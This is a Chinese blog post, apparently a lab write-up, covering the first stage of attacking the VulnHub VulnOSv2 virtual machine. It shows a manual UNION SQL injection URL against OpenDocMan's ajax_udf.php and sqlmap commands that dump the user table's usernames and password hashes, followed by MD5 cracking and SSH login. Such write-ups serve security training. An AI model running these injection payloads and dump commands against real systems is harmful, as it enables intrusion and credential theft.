# vulnhub之VulnOSv2的实践（一）

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzA3MjM5MDc2Nw==&mid=2650744747&idx=1&sn=3ca7d0b4c06338161188aeefb2e095eb&chksm=871486abb0630fbd1ec341812489a11f4df57a4ffa5979c96afb7d5f524ec88cffc190e6771d&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&mid=2650744747&idx=1&sn=3ca7d0b4c06338161188aeefb2e095eb&chksm=871486abb0630fbd1ec341812489a11f4df57a4ffa5979c96afb7d5f524ec88cffc190e6771d&scene=27#wechat_redirect)

很久没做网络安全相关的实践了，利用十一假期把之前下载的VulnOSv2搞一下，

需要Virtualbox才能打开，我给了一个hostonly的网卡，

![](../Images/f9a5d2aa7903b153b1cca44baf01dfe2.png)

首先要解决的是靶机地址是啥，既然知道hostonly的网段，装一个kali，做个主机扫描就可以了，

![](../Images/24ac7b4fa234f51825183c6c86a8132f.png)

试了一下100无法ping通，101可以，则猜测100是dhcp服务，101是靶机，

继续对靶机进行服务扫描，

![](../Images/bced9c0e71e265e40da6b7c827bef749.png)

http服务开着，那就访问一下试试，

![](../Images/f8f859203208b262d0553b8d3ebfa8be.png)

点击链接查看页面的源码，到doc页面时发现里面有隐藏的url,

![](../Images/91b8280c4800d5a65b488e79efb228d1.png)

访问进去，发现是OpenDocMan应用，

![](../Images/9e124f17e3d7ee7549e9dd5432e4ac6a.png)

在网上搜这个版本号的漏洞，

![](../Images/fbd94df6c910075aa083de65fdd7999e.png)

能做SQL注入，真是太好了，

先手工注一下，http://192.168.56.101/jabcd0cs/ajax\_udf.php?q=1&add\_value=odm\_user%20UNION%20SELECT%201,version%28%29,3,4,5,6,7,8,9，

![](../Images/ee4111299231f5412e76066b0614e623.png)

然后用sqlmap自动注，先看有哪些数据库，sqlmap.py -u "http://192.168.0.170/jabcd0cs/ajax\_udf.php?q=1&add\_value=odm\_user" -p add\_value --dbms MySQL 5.5.47 --dbs，

![](../Images/e6015933e09d95a9808a1dbd3a2b3e0c.png)

再看看jabcd0cs数据库里有哪些表，sqlmap.py -u "http://192.168.0.170/jabcd0cs/ajax\_udf.php?q=1&add\_value=odm\_user" -p add\_value -D jabcd0cs --dbms MySQL 5.5.47 --tables，

![](../Images/a5cd9f8feeebbd7cf927ae0f95a9598d.png)

再看看odm\_user数据表里有哪些字段，sqlmap.py -u "http://192.168.0.170/jabcd0cs/ajax\_udf.php?q=1&add\_value=odm\_user" -p add\_value -D jabcd0cs -T odm\_user --dbms MySQL 5.5.47 --columns，

![](../Images/1fa9c908b253ea6e224b335fcf80b53e.png)

最后再看看username和password字段的详细内容，sqlmap.py -u "http://192.168.0.170/jabcd0cs/ajax\_udf.php?q=1&add\_value=odm\_user" -p add\_value -D jabcd0cs -T odm\_user -C "username,password" --dbms MySQL 5.5.47 --dump，

![](../Images/44e52b7dce52428b092e52f146487aea.png)

知道了webmin是一个用户，密码是md5的，需要破解一下，

访问http://md5decrypt.net/en/，

![](../Images/58b96daa818af3383fc282bb934cd7d6.png)

密码明文原来是webmin1980，

就可以远程ssh靶机了，

![](../Images/3862c7908ac64a801b0e883e40366133.png)

到这儿应该再继续实践提权，但是实践开始时忘了给访问公网的条件，留个尾巴，下次继续。
